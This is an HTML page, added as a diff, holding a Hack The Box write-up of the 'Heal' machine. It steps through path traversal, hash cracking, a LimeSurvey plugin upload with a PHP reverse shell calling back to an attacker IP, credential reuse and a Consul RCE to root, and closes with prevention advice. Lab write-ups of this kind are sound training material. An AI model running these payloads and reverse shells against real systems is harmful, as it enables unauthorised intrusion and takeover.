@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en" class="dark-theme">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Detailed write-up of the Heal machine from Hack The Box, focusing on web app and strong enumeration">
+    <meta property="og:title" content="HTB Heal write-up">
+    <meta property="og:description" content="Detailed write-up of the Heal machine from Hack The Box, focusing on web app and strong enumeration">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bb4go.github.io/writeups/heal.html">
+    <link rel="canonical" href="https://bb4go.github.io/writeups/heal.html">
+    <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+    <link rel="stylesheet" href="../css/style.css">
+    <title>HTB Heal Walkthrough - b4go</title>
+</head>
+<body>
+    <header>
+        <div class="header-content container">
+            <div class="logo">
+                <a href="../index.html">b4go</a>
+            </div>
+            <nav class="main-nav">
+                <button class="mobile-menu-toggle" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+                <ul class="nav-list">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="../projects.html">Projects</a></li>
+                    <li class="active"><a href="../writeups.html">Write-ups</a></li>
+                    <li><a href="../about.html">About Me</a></li>
+                    <li>
+                        <button class="theme-toggle" aria-label="Toggle theme">
+                            <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+                            <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+                        </button>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <main>
+    <article class="content-with-nav">
+            <div class="container">
+                <div class="article-header">
+                    <h1>Heal</h1>
+                    <div class="meta">
+                        <span class="date">Published: May 17, 2025</span>
+                        <div class="tags">
+                            <span class="tag">#htb</span>
+                            <span class="tag">#linux</span>
+                            <span class="tag">#limesurvey</span>
+                             <span class="tag">#consul</span>
+                            <span class="tag">#medium</span>
+                            <span class="tag">#oscp</span>
+                        </div>
+                    </div>
+                </div>
+                <div id="reading-time" class="reading-time"></div>
+
+                <div class="content-layout">
+                    <div class="main-content">
+                <section id="introduction" class="content-section">
+                    <h2>Introduction</h2>
+                    <p>Heal is a Medium rated Linux machine on Hack The Box that blends modern web application enumeration with misconfigurations in popular DevOps tooling. The box pivots from uncovering hidden sub-domains in a React SPA to abusing a LimeSurvey plugin upload for initial RCE, then leverages leaked database credentials to move laterally before rounding things off with a HashiCorp Consul privilege escalation to root.</p>
+                </section>
+
+
+
+                        <section id="reconnaissance" class="content-section">
+                            <h2>Reconnaissance</h2>
+                            <h3>Initial Port Scan</h3>
+                            <div class="code-block">
+                                <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+                                <pre><code class="language-bash">b4go@kali:~/htb/heal$ nmap -sCV -p- --open -oA heal 10.10.11.46 -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-16 07:16 EDT
+Nmap scan report for heal.htb (10.10.11.46)
+Host is up (0.047s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
+|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Heal
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.71 seconds</code></pre>
+                            </div>
+
+                            <p>Let's add <code>heal.htb</code> to our hosts.</p>
+                            <div class="code-block">
+                                <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+                                <pre><code class="language-bash">b4go@kali:~/htb/heal$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.11.46     heal.htb
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters</code></pre>
+                            </div>
+
+                        </section>
+                           <section id="enumeration" class="content-section">
+    <h2>Web Enumeration &amp; Discovery</h2>
+
+
+    <h3>First site (<code>heal.htb</code>)</h3>
+    <p>We land on the main portal and find a login panel.</p>
+    <img src="../boximages/heal/1.png">
+
+    <br>
+    <p>I tried a few obvious creds, no dice, so I fired up BurpSuite and watched the traffic:</p>
+    <img src="../boximages/heal/2.png">
+    <br>
+    <p>It is not sending a <code>POST</code> request but an <code>OPTIONS</code>, there seems to be a new subdomain <strong>api.heal.htb</strong> so I will add it to hosts file as well.</p>
+
+    
+    <h3>In <code>api.heal.htb</code> we are presented a new app</h3>
+    <img src="../boximages/heal/3.png" >
+    <br>
+    <p>My initial thought is to start looking the version has any vulnerabilities but haven't found anything useful</p>
+
+   
+    <h3>Single-Page-App problem</h3>
+    <p>The whole thing is a <strong>React SPA</strong>; every URL (<code>/survey</code>, <code>/resume</code> …) is routed client-side, so the server always hands back the same HTML.  
+    Fuzzers like <code>ffuf</code> or <code>dirsearch</code> just see identical 200 responses and think they’re dead ends.</p>
+
+
+    <p>I switched to a crawler instead, let's use <code>gospider</code>:</p>
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal/spider-results$ gospider -s http://heal.htb -t 10 -o spider-results        
+[url] - [code-200] - http://heal.htb
+[javascript] - http://heal.htb/static/js/bundle.js
+[javascript] - http://heal.htb/static/js/0.chunk.js
+[javascript] - http://heal.htb/static/js/main.chunk.js
+[subdomains] - api.heal.htb
+[subdomains] - take-survey.heal.htb
+[linkfinder] - [from: http://heal.htb/static/js/main.chunk.js] - ./node_modules/css-loader/dist/cjs.js?!./node_modules/postcss-loader/src/index.js?!./src/App.css
+[linkfinder] - [from: http://heal.htb/static/js/main.chunk.js] - ./node_modules/css-loader/dist/runtime/api.js
+[linkfinder] - [from: http://heal.htb/static/js/main.chunk.js] - ./node_modules/css-loader/dist/cjs.js?!./node_modules/postcss-loader/src/index.js?!./src/components/Error.css
+...
+</code></pre>
+    </div>
+
+
+    <p>After poking around for a while I managed to find this endpoint </p>
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal/spider-results$ cat spider-results | grep linkfinder
+...
+[linkfinder] - [from: http://heal.htb/static/js/main.chunk.js] - /survey
+...
+</code></pre>
+    </div>
+
+  
+    <h3>New sub-domain (<code>take-survey.heal.htb</code>)</h3>
+    <p><code>take the survey</code> redirects us the another subdomain we didn't have earlier, I will add it to hosts file too</p>
+
+    <img src="../boximages/heal/4.png" >
+    <br>
+    <p>The redirect:</p>
+    <br>
+    <img src="../boximages/heal/5.png" >
+    <br>
+    <p>The new page shows LimeSurvey, I don't know the version of the app to look for vulnerabilities yet but the page shows Ralph’s email, hinting registration needs the proper domain.</p>
+    <img src="../boximages/heal/6.png" >
+    <br>
+    <p>I sign up again (this time with <code>@heal.htb</code>) and it works.</p>
+ 
+    <p>
+    <img src="../boximages/heal/7.png" >
+    <img src="../boximages/heal/8.png">
+
+    <p>I will fill all the data and hit <em>export</em> as pdf, I had burpsuite running the whole time, so I will check the requests right after.
+when hitting export I automatically download a PDF</p>
+    <img src="../boximages/heal/9.png" >
+    <img src="../boximages/heal/10.png" >
+
+     <br>
+    <p>I noticed the parameter filename so I start trying but we have an <code>OPTIONS</code> request, let's change it to <code>GET</code> and start trying path traversal here:
+    <br>
+    <br>
+    <img src="../boximages/heal/11.png" >
+
+    <p>Since it’s a Ruby app I start trying key files (<code>database.yml</code>, <code>secrets.yml</code>, …).</p>
+    <img src="../boximages/heal/12.png" >
+    <br>
+
+
+    <p>The dump throws some bcrypt hashes, let's try and crack them</p>
+    <img src="../boximages/heal/13.png" >
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --show
+$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
+</code></pre>
+    </div>
+
+    <p>Password <code>147258369</code> belongs to <strong>ralph</strong>, I immediately try to login via SSH and the main portal but without luck.</p>
+
+    <h3>Directory fuzzing (<code>take-survey.heal.htb</code>)</h3>
+    <p>Let's try fuzzing take-survey.heal.htb with <code>dirsearch</code>, there must be somewhere where we can use this password.</p>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal$ dirsearch -u http://take-survey.heal.htb/index.php/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x 404,503
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                            
+ (_||| _) (/_(_|| (_| )                                                                                                                                     
+                                                                                                                                                            
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4744
+
+Output File: /home/b4go/htb/heal/reports/http_take-survey.heal.htb/_index.php__25-05-17_09-08-37.txt
+
+Target: http://take-survey.heal.htb/
+
+[09:08:37] Starting: index.php/                                                                                                                             
+[09:08:47] 302 -    0B  - /index.php/admin  ->  http://take-survey.heal.htb/index.php/admin/authentication/sa/login
+[09:09:06] 200 -   74KB - /index.php/index.php                              
+[09:09:07] 500 -    5KB - /index.php/installer                              
+[09:09:17] 302 -    0B  - /index.php/plugins  ->  http://take-survey.heal.htb/index.php/admin/pluginmanager/sa/index
+                                                                             
+Task Completed     
+</code></pre>
+    </div>
+
+    <p>The redirect reveals an <strong>admin panel</strong> — version&nbsp;6.6.4.</p>
+    <img src="../boximages/heal/14.png" >
+    <img src="../boximages/heal/15.png" >
+
+    <p>And that’s our foothold. Let's keep going</p>
+</section>
+
+                            
+
+ <section id="exploitation" class="content-section">
+<h2>Initial Foothold – LimeSurvey Auth-RCE</h2>
+
+    <p>Version&nbsp;6.6.4 of LimeSurvey is running, and there’s a handy authenticated RCE plugin exploit here:  
+        <a href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE" target="_blank" rel="noopener">github.com/Y1LD1R1M-1337/Limesurvey-RCE</a>.</p>
+
+    <h3>Preparing the malicious plugin</h3>
+    <p>The repo gives us two files: <code>config.xml</code> and <code>php-rev.php</code>.  
+    We tweak them so the plugin matches our target version and calls back to us.</p>
+<p>I add version <strong>6.6.4</strong> for compatibility</p>
+   <div class="code-block">
+  <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+  <pre><code class="language-xml">
+b4go@kali:~/htb/heal/Limesurvey-RCE$ cat config.xml
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;config&gt;
+    &lt;metadata&gt;
+        &lt;name&gt;reverse&lt;/name&gt;
+        &lt;type&gt;plugin&lt;/type&gt;
+        &lt;creationDate&gt;2020-03-20&lt;/creationDate&gt;
+        &lt;lastUpdate&gt;2020-03-31&lt;/lastUpdate&gt;
+        &lt;author&gt;Y1LD1R1M&lt;/author&gt;
+        &lt;authorUrl&gt;https://github.com/Y1LD1R1M-1337&lt;/authorUrl&gt;
+        &lt;supportUrl&gt;https://github.com/Y1LD1R1M-1337&lt;/supportUrl&gt;
+        &lt;version&gt;5.0&lt;/version&gt;
+        &lt;license&gt;GNU General Public License version 2 or later&lt;/license&gt;
+        &lt;description&gt;
+            &lt;![CDATA[Author : Y1LD1R1M]]&gt;&lt;/description&gt;
+    &lt;/metadata&gt;
+
+    &lt;compatibility&gt;
+        &lt;version&gt;3.0&lt;/version&gt;
+        &lt;version&gt;4.0&lt;/version&gt;
+        &lt;version&gt;5.0&lt;/version&gt;
+        &lt;version&gt;<strong>6.6.4</strong>&lt;/version&gt;
+    &lt;/compatibility&gt;
+    &lt;updaters disabled="disabled"&gt;&lt;/updaters&gt;
+&lt;/config&gt;
+  </code></pre>
+</div>
+
+
+     <p>for the php-rev.php we must change IP and PORT</p>
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code>b4go@kali:~/htb/heal/Limesurvey-RCE$ cat php-rev.php 
+&lt?php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.14.16';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+...
+?&gt;
+</code></pre>
+    </div>
+
+    <p>Bundle it up:</p>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal/Limesurvey-RCE$ zip -r reverse.zip config.xml php-rev.php 
+  adding: config.xml (deflated 56%)
+  adding: php-rev.php (deflated 61%)</code></pre>
+    </div>
+
+    <h3>Upload &amp; trigger</h3>
+    <ol>
+        <li>Log in to the LimeSurvey admin panel.</li>
+        <li>Upload <code>reverse.zip</code> as a plugin and activate it.</li>
+        <img src="../boximages/heal/16.png">
+        <li>Set up the listener:</li>
+    </ol>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal$ nc -lvnp 1234</code></pre>
+    </div>
+
+    <ol start="4">
+        <li>Hit the payload URL to pop the shell:</li>
+    </ol>
+    <p><code>http://take-survey.heal.htb/upload/plugins/reverse/php-rev.php</code></p>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal/Limesurvey-RCE$ nc -lvnp 1234      
+listening on [any] 1234 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.46] 56304
+Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux                                                    
+ 13:33:15 up 1 day,  2:57,  0 users,  load average: 0.01, 0.04, 0.02                                                                                        
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                         
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                       
+/bin/sh: 0: can't access tty; job control turned off                                                                                                        
+$                                                                                         </code></pre>
+    </div>
+
+    <h3>Priv esc enum (<code>www-data</code>)</h3>
+    <p>We’re in as <code>www-data</code>. so my first thought is that I should log in as another user and then escalate to root.
+let's start enumerating the home directories..</p>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">www-data@heal:/etc$ ls /home
+ralph  ron</code></pre>
+    </div>
+
+    <p>I guess there will be some hard coded credentials somewhere I look for those files, starting by <code>.php conf</code> files::</p>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">www-data@heal:/etc$ find / -name *config.php 2>/dev/null 
+/var/www/limesurvey/vendor/tecnickcom/tcpdf/tcpdf_autoconfig.php
+/var/www/limesurvey/vendor/tecnickcom/tcpdf/config/tcpdf_config.php
+/var/www/limesurvey/vendor/kcfinder/conf/config.php
+/var/www/limesurvey/vendor/yiisoft/yii/framework/messages/config.php
+/var/www/limesurvey/vendor/yiisoft/yii/requirements/messages/config.php
+/var/www/limesurvey/application/config/config.php
+</code></pre>
+    </div>
+<p>config.php is a good place to start.</p>
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-php">www-data@heal:/etc$ cat /var/www/limesurvey/application/config/config.php
+<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
+/*
+| -------------------------------------------------------------------
+| DATABASE CONNECTIVITY SETTINGS
+| -------------------------------------------------------------------
+| This file will contain the settings needed to access your database.
+|
+| For complete instructions please consult the 'Database Connection'
+| page of the User Guide.
+|
+| -------------------------------------------------------------------
+| EXPLANATION OF VARIABLES
+| -------------------------------------------------------------------
+|
+|    'connectionString' Hostname, database, port and database type for 
+|     the connection. Driver example: mysql. Currently supported:
+|                 mysql, pgsql, mssql, sqlite, oci
+|    'username' The username used to connect to the database
+|    'password' The password used to connect to the database
+|    'tablePrefix' You can add an optional prefix, which will be added
+|                 to the table name when using the Active Record class
+|
+*/
+return array(
+        'components' => array(
+                'db' => array(
+                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
+                        'emulatePrepare' => true,
+                        'username' => 'db_user',
+                        'password' => 'AdmiDi0_pA$$w0rd',
+                        'charset' => 'utf8',
+                        'tablePrefix' => 'lime_',
+                ),
+
+                 'session' => array (
+                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
+                        // Uncomment the following lines if you need table-based sessions.
+                        // Note: Table-based sessions are currently not supported on MSSQL server.
+                        // 'class' => 'application.core.web.DbHttpSession',
+                        // 'connectionID' => 'db',
+                        // 'sessionTableName' => '{{sessions}}',
+                 ),
+
+                'urlManager' => array(
+                        'urlFormat' => 'path',
+                        'rules' => array(
+                                // You can add your own rules here
+                        ),
+                        'showScriptName' => true,
+                ),
+
+                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
+                //'request' => array(
+                //      'baseUrl' => '/limesurvey',
+                //),
+        ),
+        // For security issue : it's better to set runtimePath out of web access
+        // Directory must be readable and writable by the webuser
+        // 'runtimePath'=>'/var/limesurvey/runtime/'
+        // Use the following config variable to set modified optional settings copied from config-defaults.php
+        'config'=>array(
+        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
+        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
+        // on your webspace.
+        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
+                'debug'=>0,
+                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2
+
+                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
+                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
+                //'publicurl' => 'https://www.example.org/limesurvey',
+
+                // Update default LimeSurvey config here
+        )
+);
+/* End of file config.php */
+/* Location: ./application/config/config.php */</code></pre>
+    </div>
+<div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">www-data@heal:/etc$ psql -h localhost -U db_user
+Password for user db_user: 
+psql: error: connection to server at "localhost" (127.0.0.1), port 5432 failed: FATAL:  database "db_user" does not exist
+</code></pre>
+    </div>
+    <p>Database login fails, but those creds work for user enumeration: <code>su ron</code> drops us into Ron’s shell and gives us <em>user.txt</em>.</p>
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">www-data@heal:/etc$ su ralph
+Password: 
+su: Authentication failure
+</code></pre>
+    </div>
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">www-data@heal:/etc$ su ron
+Password: 
+ron@heal:/etc$
+</code></pre>
+    </div>
+<img src="../boximages/heal/26.png">
+<p>we've got the first flag:</p>
+ </section>
+ <section id="privilege-escalation" class="content-section">
+   <h2>Privilege Escalation</h2>
+
+    
+
+    <p><code>sudo -l</code> gives us nothing useful since we are not in sudoers file:</p>
+    
+    <h3>Port hunting</h3>
+    <p>After enumerating for a while a decide to use ss -antlp and see open ports, maybe we can do portforwarding and get a shell as user ralph:.</p>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">ron@heal:/tmp$ ss -antlp
+State                   Recv-Q                  Send-Q                                   Local Address:Port                                   Peer Address:Port                 Process                 
+LISTEN                  0                       1024                                         127.0.0.1:3001                                        0.0.0.0:*                                            
+LISTEN                  0                       511                                          127.0.0.1:3000                                        0.0.0.0:*                                            
+LISTEN                  0                       4096                                         127.0.0.1:8301                                        0.0.0.0:*                                            
+LISTEN                  0                       4096                                         127.0.0.1:8300                                        0.0.0.0:*                                            
+LISTEN                  0                       4096                                         127.0.0.1:8302                                        0.0.0.0:*                                            
+LISTEN                  0                       4096                                         127.0.0.1:8500                                        0.0.0.0:*                                            
+LISTEN                  0                       4096                                         127.0.0.1:8503                                        0.0.0.0:*                                            
+LISTEN                  0                       128                                            0.0.0.0:22                                          0.0.0.0:*                                            
+LISTEN                  0                       4096                                         127.0.0.1:8600                                        0.0.0.0:*                                            
+LISTEN                  0                       511                                            0.0.0.0:80                                          0.0.0.0:*                                            
+LISTEN                  0                       4096                                     127.0.0.53%lo:53                                          0.0.0.0:*                                            
+LISTEN                  0                       244                                          127.0.0.1:5432                                        0.0.0.0:*                                            
+LISTEN                  0                       128                                               [::]:22                                             [::]:*                  </code></pre>
+    </div>
+
+    <p>Port&nbsp;<strong>8500</strong> (Consul) looks interesting, let's.  
+    Forward it to our box and log back in as <code>ron</code>:</p>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:/opt$ ssh -L 8500:127.0.0.1:8500 ron@heal.htb   
+The authenticity of host 'heal.htb (10.10.11.46)' can't be established.
+ED25519 key fingerprint is SHA256:/VqroO/Kmxq00rboKFY9TylfAkNdJOiWIOBhnIA4VMs.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:8: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'heal.htb' (ED25519) to the list of known hosts.
+ron@heal.htb's password: 
+
+Permission denied, please try again.
+ron@heal.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat May 17 03:26:01 PM UTC 2025
+
+  System load:           0.01
+  Usage of /:            83.0% of 7.71GB
+  Memory usage:          30%
+  Swap usage:            0%
+  Processes:             255
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.46
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:99f7
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+29 updates can be applied immediately.
+18 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update</code></pre>
+    </div>
+
+    <p>Browsing <code>http://127.0.0.1:8500</code> through the tunnel shows Consul&nbsp;v1.19.2.</p>
+    <img src="../boximages/heal/28.png">
+
+    <h3>Finding an exploit</h3>
+    <p>I will check whether there are any exploits available:</p>
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal$ searchsploit consul
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)                                                                         | linux/remote/46073.rb
+Hashicorp Consul - Remote Command Execution via Services API (Metasploit)                                                                  | linux/remote/46074.rb
+Hashicorp Consul v1.0 - Remote Command Execution (RCE)                                                                                     | multiple/remote/51117.txt
+Hassan Consulting Shopping Cart 1.18 - Directory Traversal                                                                                 | cgi/remote/20281.txt
+Hassan Consulting Shopping Cart 1.23 - Arbitrary Command Execution                                                                         | cgi/remote/21104.pl
+PHPLeague 0.81 - '/consult/miniseul.php?cheminmini' Remote File Inclusion                                                                  | php/webapps/28864.txt
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre>
+    </div>
+
+    <p>there is a RCE for v1.0, I will give it a try: </p>
+
+    <div class="code-block">
+        <button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+<pre><code class="language-bash">b4go@kali:~/htb/heal$ searchsploit -m multiple/remote/51117.txt
+  Exploit: Hashicorp Consul v1.0 - Remote Command Execution (RCE)
+      URL: https://www.exploit-db.com/exploits/51117
+     Path: /usr/share/exploitdb/exploits/multiple/remote/51117.txt
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/b4go/htb/heal/51117.txt
+</code></pre>
+    </div>
+    <div class="code-block"><button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+    <pre><code class="language-bash">b4go@kali:~/htb/heal$ python exploit.py                                  
+[-] Usage: python3 exploit.py &lt;rhost&gt; &lt;rport&gt; &lt;lhost&gt; &lt;lport&gt; &lt;acl_token&gt;</code></pre>
+    </div>
+    <div class="code-block"><button class="copy-btn" aria-label="Copy command to clipboard">📋 Copy</button>
+    <pre><code class="language-bash">b4go@kali:~/htb/heal$ python exploit.py localhost 8500 10.10.14.16 443 dummy
+
+[+] Request sent successfully, check your listener</code></pre>
+    </div>
+
+    <p>The reverse shell connects back as <strong>root</strong> so we can finally get the <em>root</em> flag:</p>
+    <img src="../boximages/heal/30.png" >
+                        
+                        </section>
+                        <section id="conclusion" class="content-section">
+                            <h2>Conclusion</h2>
+                            <p>Heal was a chain-reaction of small misses: a noisy SPA route, a lazy path-traversal check, an “anyone can upload” LimeSurvey plugin, reused DB creds, and Consul running wide-open. Nothing exotic, just known bugs waiting to be chained until root.</p>
+                            
+                            <h3>Prevention:</h3>
+                            <ul>
+                                <li>Disable or at least sign and approve—plugin uploads on production LimeSurvey. </li>
+                                <li>Hand every service its own password, rotate them through a secrets vault.</li>
+                                <li>Run Consul (and other ops tools) with ACLs on and bound to a management-only interface.</li>
+                                <li>Reject ../ and similar tricks server-side; never trust a client-supplied filename.</li>
+                            </ul>
+                        </section>
+
+                    </div>
+
+                    <aside class="content-nav">
+                        <nav class="scrollspy-nav">
+                            <ul>
+                                <li><a href="#introduction">Introduction</a></li>
+                                <li><a href="#reconnaissance" class="active">Reconnaissance</a></li>
+                                <li><a href="#enumeration">Enumeration</a></li>
+                                <li><a href="#exploitation">Exploitation</a></li>
+                                <li><a href="#privilege-escalation">Privilege escalation</a></li>
+                                <li><a href="#conclusion">Conclusion</a></li>
+                            </ul>
+                        </nav>
+                    </aside>
+                </div>
+            </div>
+        </article>
+    </main>
+
+    <button id="back-to-top" aria-label="Back to top">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+    </button>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="social-links">
+                    <a href="https://github.com/bb4go/" aria-label="GitHub">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+                    </a>
+                    <a href="rss.xml" aria-label="RSS Feed">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg>
+                    </a>
+                    <a href="mailto:b4go@protonmail.com" aria-label="mail">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2" ry="2"></rect><polyline points="3 7 12 13 21 7"></polyline></svg>
+                    </a>
+                    <a href="https://buymeacoffee.com/b4go" aria-label="Buy Me a Coffee" target="_blank" rel="noopener">
